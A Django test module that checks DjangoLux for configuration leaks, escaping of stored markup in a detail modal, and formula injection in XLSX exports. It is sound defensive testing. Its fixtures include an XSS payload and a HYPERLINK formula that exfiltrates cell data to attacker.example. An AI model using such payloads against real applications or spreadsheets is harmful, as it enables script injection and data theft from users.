"""What DjangoLux writes out must not leak settings or run what users stored.

- A page hands its scripts only ``CLIENT_CONFIG_KEYS``, never the whole system
  configuration: every visitor receives that block, signed in or not.
- The generic detail modal escapes stored values. Only markup DjangoLux builds
  itself (download links, boolean icons) is marked safe.
- XLSX exports write strings as text cells. A value such as ``=HYPERLINK(...)``
  from a record, an activity log or a request header never becomes a formula.
"""

import io
import json
import re
import zipfile
from pathlib import Path

from django.apps import apps
from django.contrib.auth import get_user_model
from django.contrib.sessions.backends.db import SessionStore
from django.template.loader import render_to_string
from django.test import RequestFactory, TestCase

from dlux.models import SystemSettings
from dlux.system.constants import CLIENT_CONFIG_KEYS
from dlux.utils import _build_generic_detail_context
from dlux.utils.spreadsheets import append_text_safe_row

DLUX_ROOT = Path(__file__).resolve().parents[1]
STORED_MARKUP = '<img src=x onerror="alert(1)">'
FORMULA = '=HYPERLINK("http://attacker.example/?d="&A1,"open")'

User = get_user_model()


def _page_config(html):
    match = re.search(r'<script id="dlux-config-data" type="application/json"[^>]*>(.*?)</script>', html, re.S)
    if match is None:
        raise AssertionError('the page has no dlux-config-data block')
    return json.loads(match.group(1))


def _sheets_have_formulas(content):
    with zipfile.ZipFile(io.BytesIO(content)) as archive:
        return any(
            '<f>' in archive.read(name).decode()
            for name in archive.namelist()
            if name.startswith('xl/worksheets/')
        )


def _text_cells(content, value):
    from openpyxl import load_workbook

    workbook = load_workbook(io.BytesIO(content))
    return [
        cell.data_type
        for sheet in workbook.worksheets
        for row in sheet.iter_rows()
        for cell in row
        if cell.value == value
    ]


class PageConfigTests(TestCase):
    def setUp(self):
        record = SystemSettings.load()
        record.is_configured = True
        record.email_config = {
            **(record.email_config or {}),
            'host': 'smtp.sentinel.example',
            'username': 'mailer-sentinel',
        }
        record.save()

    def _assert_client_keys_only(self, html):
        self.assertEqual(set(_page_config(html)), set(CLIENT_CONFIG_KEYS))
        self.assertNotIn('smtp.sentinel.example', html)
        self.assertNotIn('mailer-sentinel', html)

    def test_an_anonymous_visitor_gets_only_the_client_keys(self):
        response = self.client.get('/accounts/login/')
        self.assertEqual(response.status_code, 200)
        self._assert_client_keys_only(response.content.decode())

    def test_a_signed_in_page_gets_only_the_client_keys(self):
        self.client.force_login(User.objects.create_superuser('cfg-admin', 'cfg@example.org', 'pw-for-tests-only'))
        response = self.client.get('/accounts/profile/')
        self.assertEqual(response.status_code, 200)
        self._assert_client_keys_only(response.content.decode())

    def test_every_key_shipped_scripts_read_is_sent(self):
        read = set()
        for script in (DLUX_ROOT / 'static').rglob('*.js'):
            if not script.is_file() or script.name.endswith('.min.js'):
                continue
            text = script.read_text(encoding='utf-8', errors='ignore')
            read.update(re.findall(r'DLUX_CONFIG(?:\s*\|\|\s*\{\}\))?\.(\w+)', text))
        self.assertTrue(read)
        self.assertLessEqual(read, set(CLIENT_CONFIG_KEYS))


class GenericDetailEscapingTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_superuser('detail-admin', 'detail@example.org', 'pw-for-tests-only')

    def _render(self, instance):
        request = RequestFactory().get('/')
        request.session = SessionStore()
        request.user = self.user
        fields = _build_generic_detail_context(instance, request=request)
        html = render_to_string(
            'dlux/helpers/dynamic_modal_detail.html',
            {'auto_detail_fields': fields, 'object': instance},
            request=request,
        )
        return fields, html

    def test_stored_markup_renders_as_text(self):
        Paper = apps.get_model('document_files_app', 'Paper')
        fields, html = self._render(Paper(title=STORED_MARKUP))

        title = next(field for field in fields if field['value'] == STORED_MARKUP)
        self.assertFalse(title['is_html'])
        self.assertNotIn(STORED_MARKUP, html)
        self.assertIn('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;', html)

    def test_markup_dlux_builds_still_renders(self):
        Paper = apps.get_model('document_files_app', 'Paper')
        _, html = self._render(Paper(title='Paper', pdf_file='papers/a"b.pdf'))
        self.assertIn('<a href="/media/papers/a%22b.pdf" target="_blank"', html)

        record = SystemSettings(public_root=True)
        _, html = self._render(record)
        self.assertIn('<i class="bi bi-check-circle-fill text-success"></i>', html)


class SpreadsheetFormulaTests(TestCase):
    def setUp(self):
        self.actor = User.objects.create_superuser('xlsx-admin', 'xlsx@example.org', 'pw-for-tests-only')

    def test_a_string_starting_with_equals_is_written_as_text(self):
        from openpyxl import Workbook

        workbook = Workbook()
        append_text_safe_row(workbook.active, [FORMULA, '+1', '@SUM(1)', 7])
        stream = io.BytesIO()
        workbook.save(stream)

        self.assertFalse(_sheets_have_formulas(stream.getvalue()))
        self.assertEqual(_text_cells(stream.getvalue(), FORMULA), ['s'])

    def test_table_export_writes_record_values_as_text(self):
        from dlux.fetcher import fetch_excel

        User.objects.create_user('formula-user', 'f@example.org', 'pw-for-tests-only', first_name=FORMULA)
        request = RequestFactory().get('/')
        request.user = self.actor
        content = fetch_excel(request, User.objects.order_by('pk')).content

        self.assertFalse(_sheets_have_formulas(content))
        self.assertEqual(_text_cells(content, FORMULA), ['s'])

    def test_report_entries_export_writes_record_values_as_text(self):
        from dlux.reports import build_model_entries_xlsx, build_reports_overview

        Paper = apps.get_model('document_files_app', 'Paper')
        Paper.objects.create(title=FORMULA)
        content = build_model_entries_xlsx(self.actor, build_reports_overview(self.actor, window='all'))

        self.assertFalse(_sheets_have_formulas(content))
        self.assertEqual(_text_cells(content, FORMULA), ['s'])

    def test_user_report_writes_request_headers_as_text(self):
        from dlux.reports.users import build_user_report, build_user_report_xlsx

        ActivityLog = apps.get_model('dlux', 'ActivityLog')
        ActivityLog.objects.create(
            created_by=self.actor, action='CREATE', model_name='Project Entry',
            ip_address='10.0.0.9', user_agent=FORMULA,
        )
        report = build_user_report(self.actor, actor=self.actor, window='all')
        content = build_user_report_xlsx(report, window='all')

        self.assertFalse(_sheets_have_formulas(content))
        self.assertEqual(_text_cells(content, FORMULA), ['s'])

    def test_every_workbook_writer_appends_through_the_guard(self):
        writers = [
            path for path in DLUX_ROOT.rglob('*.py')
            if 'tests' not in path.parts and 'Workbook(' in path.read_text(encoding='utf-8')
        ]
        self.assertTrue(writers)
        for path in writers:
            text = path.read_text(encoding='utf-8')
            self.assertIn('append_text_safe_row', text, path)
            self.assertIsNone(re.search(r'\b(?:ws|info|sheet|worksheet|summary)\.append\(', text), path)
